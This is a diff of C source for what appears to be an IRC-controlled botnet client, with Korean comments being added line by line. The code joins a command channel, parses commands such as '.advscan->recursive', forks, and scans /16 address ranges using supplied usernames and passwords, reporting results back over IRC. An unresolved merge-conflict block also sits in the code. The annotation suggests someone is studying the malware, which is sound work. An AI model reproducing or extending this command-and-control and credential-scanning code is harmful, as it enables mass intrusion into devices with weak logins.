@@ -66,15 +66,19 @@ int pub_requests(sock_t *sp, requests_t *req) {
         if (! strncmp(req->rcv_b, "433", strlen(req->rcv_b))) {
             getrstr();
             if (sockwrite(sp->sockfd, "NICK %s\n", data_ptr)) return EXIT_FAILURE;
-        } // rcv_b가 "433"과 같으면, getrstr을 호출해 data_ptr을 반환한 후, 소켓번호 sockfd를 이용해 data_ptr을 전송한다. 실패시엔 EXIT_FAILURE를 반환한다
+        } // rcv_b가 "433"과 같으면, getrstr을 호출해 data_ptr을 반환한 후, 소켓번호 sockfd를 이용해 data_ptr과 문자열을 전송한다. 실패시엔 EXIT_FAILURE를 반환한다
         else if (! strncmp(req->rcv_b, "001", strlen(req->rcv_b))) {
             if (cmd_init(sp) == false) return EXIT_FAILURE;
+<<<<<<< HEAD
         }  // 채널에 연결되었는지 연결 여부를 확인하고 결과값을 반환
+=======
+        } // rcv_b가 "001"과 같으면 채널에 가입한다. 실패시 fail
+>>>>>>> e2f2e548b38154d2d145818779544970c9d59ab7
         else if (! strncmp(req->rcv_b, "332", strlen(req->rcv_b))) {
-            if (max_pids == 0 &&  stop == 0) {
+            if (max_pids == 0 &&  stop == 0) {                              // max_pids (irc.h), stop (requests.h)
                 if (!twordcmp(":.advscan->recursive", req)) {
                     cmd_advscan_recursive(sp, req);
-                } 
+				}
                 else if (!twordcmp(":.advscan->random->b", req)) {
                     cmd_advscan_random(sp, req, 1);
                 } 
@@ -233,8 +237,9 @@ void sigkill() {
 
 /* cmd_join(sock_t *) */ 
 /* join channel after connect. */ 
+/* 연결 후에 채널에 가입한다 */
 int cmd_init(sock_t *sp) {
-    if (sockwrite(sp->sockfd, "JOIN %s :%s\n", channel, irc_chankey))
+    if (sockwrite(sp->sockfd, "JOIN %s :%s\n", channel, irc_chankey))	// channel (irc.h), irc_chankey (config.h)
         return EXIT_FAILURE;
 
     return EXIT_SUCCESS;
@@ -394,44 +399,44 @@ int cmd_advscan(sock_t *sp, requests_t *req) {
 /* cmd_advscan_recursive(sock_t *, requests_t *) */ 
 /* start the advance scanner in advscanrcs mode. */ 
 int cmd_advscan_recursive(sock_t *sp, requests_t *req) {
-    if (strcmp(req->rcv_sb, ":.advscan->recursive") == 0) {
-        if (strlen(req->rcv_sc) && strlen(req->rcv_sd)) {
-            memset(req->rcv_sb, 0, sizeof(req->rcv_sb));
+    if (strcmp(req->rcv_sb, ":.advscan->recursive") == 0) {// 같으면
+        if (strlen(req->rcv_sc) && strlen(req->rcv_sd)) {//	rcv_sc와 rcv_sd가 존재하면
+            memset(req->rcv_sb, 0, sizeof(req->rcv_sb));	// rcv_sb를 0으로 채움
     
-            if (parse_input_errors(sp, req, 3, 1)) return EXIT_FAILURE;
+            if (parse_input_errors(sp, req, 3, 1)) return EXIT_FAILURE;			// 에러체크 후 있으면 fail
             
-            snprintf(req->rcv_se, sizeof(req->rcv_se), "%s", req->rcv_sd);
-            snprintf(req->rcv_sd, sizeof(req->rcv_sd), "%s", req->rcv_sc);
+            snprintf(req->rcv_se, sizeof(req->rcv_se), "%s", req->rcv_sd);		// rcv_sd의 내용을 rcv_se에 넣음
+            snprintf(req->rcv_sd, sizeof(req->rcv_sd), "%s", req->rcv_sc);		// rcv_sc의 내용을 rcv_sd에 넣음
         }
     } 
-    else if (strlen(req->rcv_sb) && strlen(req->rcv_sc)) {
-        snprintf(req->rcv_se, sizeof(req->rcv_se), "%s", req->rcv_sc);
-        snprintf(req->rcv_sd, sizeof(req->rcv_sd), "%s", req->rcv_sb);
+    else if (strlen(req->rcv_sb) && strlen(req->rcv_sc)) {// rcv_sb와 rcv_sc가 존재하면
+        snprintf(req->rcv_se, sizeof(req->rcv_se), "%s", req->rcv_sc);			// rcv_sc의 내용을 rcv_se에 넣음
+        snprintf(req->rcv_sd, sizeof(req->rcv_sd), "%s", req->rcv_sb);			// rcv_sb의 내용을 rcv_sd에 넣음
         
-        if (parse_input_errors(sp, req, 2, 1)) return EXIT_FAILURE;
+        if (parse_input_errors(sp, req, 2, 1)) return EXIT_FAILURE;				// 에러체크
         
-        memset(req->rcv_sb, 0, sizeof req->rcv_sb);
+        memset(req->rcv_sb, 0, sizeof req->rcv_sb);								// rcv_sb를 0으로 채움
     }
 
-    if (getextip(sp, req) == true) {
-        if (strlen(req->rcv_sd) && strlen(req->rcv_se)) {
+    if (getextip(sp, req) == true) {// 외부 주소 받아옴
+        if (strlen(req->rcv_sd) && strlen(req->rcv_se)) {// rcv_sd와 rcv_se가 존재하면
             snprintf(status_temp, sizeof(status_temp), "advscan scanning range %s.%s.0.0/16 (user:%s pass:%s)", 
-            req->rcv_sb, req->rcv_sc, req->rcv_sd, req->rcv_se);
+            req->rcv_sb, req->rcv_sc, req->rcv_sd, req->rcv_se);				// status_temp에 해당 문자열을 넣음
         } 
-        else {
+        else {// 존재 하지 않으면
             snprintf(status_temp, sizeof(status_temp), "advscan scanning range %s.%s.0.0/16", 
-            req->rcv_sb, req->rcv_sc);
+            req->rcv_sb, req->rcv_sc);											// status_temp에 해당 문자열을 넣음				
         }
 
         max_pids = 1;
-        pid = fork();
+        pid = fork();		// 프로세스 복제
 
-        if (!pid) {
-            if (strlen(req->rcv_sd) && strlen(req->rcv_se)) {
+        if (!pid) {// 자식 프로세스
+            if (strlen(req->rcv_sd) && strlen(req->rcv_se)) {// rcv_sd와 rcv_se가 존재하면
                 sockwrite(sp->sockfd, 
                 "PRIVMSG %s :[advscan] scanning range: %s.%s.0.0/16 (user:%s pass:%s), wait..\n", 
-                channel, req->rcv_sb, req->rcv_sc, req->rcv_sd, req->rcv_se);
-                cmd_scan_central(sp, req, 1);
+                channel, req->rcv_sb, req->rcv_sc, req->rcv_sd, req->rcv_se);	// 메세지 전송
+                cmd_scan_central(sp, req, 1);		// scan.c 참조
             } 
             else {
                 sockwrite(sp->sockfd,
